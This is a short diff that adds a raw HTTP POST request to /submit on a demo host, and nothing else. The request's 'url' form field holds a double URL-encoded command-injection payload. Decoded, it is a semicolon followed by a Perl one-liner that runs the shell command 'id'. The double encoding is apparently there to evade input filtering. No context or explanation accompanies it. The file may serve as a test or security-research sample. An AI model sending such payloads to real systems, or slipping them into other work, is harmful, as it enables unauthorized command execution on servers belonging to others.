@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+Connection: close
+
+url=%253B%2Bperl%2B-e%2B%2527print%2B%2560id%2560%2527
